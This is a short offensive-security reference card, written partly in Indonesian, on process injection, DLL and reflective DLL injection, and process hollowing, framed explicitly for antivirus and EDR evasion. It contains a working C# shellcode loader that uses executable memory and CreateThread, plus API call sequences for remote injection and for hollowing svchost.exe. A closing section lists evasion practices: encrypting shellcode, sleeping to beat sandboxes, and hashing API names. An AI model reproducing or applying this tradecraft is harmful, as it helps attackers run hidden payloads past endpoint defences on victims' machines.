---
name: "Process Injection & Hollowing Techniques"
description: "Complete reference for process injection, DLL injection, reflective DLL injection, and process hollowing techniques in C# and PowerShell for AV/EDR evasion."
tags: [process-injection, process-hollowing, dll-injection, reflective-dll, shellcode, csharp]
---

# Process Injection & Hollowing

## Process Injection (C#)

```csharp
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
  uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
  uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
  uint dwCreationFlags, IntPtr lpThreadId);

byte[] buf = DecodeShellcode(encryptedShellcode, key);
int size = buf.Length;
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, size);
CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

## DLL Injection

`OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`

Membutuhkan proses target yang sesuai (explorer.exe, svchost.exe).

## Reflective DLL Injection

- Load DLL dari memory tanpa menyentuh disk
- Implementasi manual dari `LoadLibrary` — resolve imports sendiri
- PowerShell version via `Invoke-ReflectivePEInjection`

## Process Hollowing (C#)

```
1. CreateProcess (CREATE_SUSPENDED) — spawn svchost.exe
2. NtUnmapViewOfSection — unmap original image
3. VirtualAllocEx — allocate memory di target
4. WriteProcessMemory — write shellcode
5. SetThreadContext — set entry point ke shellcode
6. ResumeThread — execute
```

## Migration Theory

- Kenapa migrate? Hindari deteksi, dapatkan privilege lebih tinggi
- explorer.exe → user context, svchost.exe → SYSTEM
- `NtCreateSection` + `NtMapViewOfSection` — stealthier dari VirtualAlloc

## Best Practices

- Encrypt shellcode sebelum compile ke C# array
- Gunakan sleep timer sebelum injection untuk hindari sandbox
- API hashing untuk hindari string import detection
- Siapkan multiple injection methods (setidaknya inject + hollow)
